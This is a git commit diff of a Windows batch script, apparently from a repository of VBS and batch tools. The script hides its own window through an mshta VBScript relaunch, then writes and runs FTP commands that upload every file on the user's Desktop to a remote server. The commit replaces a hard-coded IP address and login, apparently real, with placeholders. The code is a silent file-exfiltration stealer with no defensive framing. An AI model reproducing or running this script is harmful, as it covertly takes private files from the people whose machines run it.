06404d1aad5684c680f21ccdf221b2fcafd10bda
Harvey <34975277+HewieWang@users.noreply.github.com>
2018-08-03 20:33:36 +0800

    Update uploadftp.bat

--- VBS/uploadftp.bat
+++ VBS/uploadftp.bat
@@ -1,8 +1,8 @@
 %1 mshta vbscript:CreateObject("WScript.Shell").Run("%~s0 ::",0,FALSE)(window.close)&&exit
 @Echo Off
-Echo open 118.193.228.140>ftp.up
-Echo adminhahaha>>ftp.up
-Echo adminhahaha>>ftp.up
+Echo open xxx.xxx.xxx.xxx>ftp.up
+Echo username>>ftp.up
+Echo password>>ftp.up
 Echo binary>>ftp.up
 Echo prompt >>ftp.up
 Echo mput %userprofile%\Desktop\*.*>>ftp.up
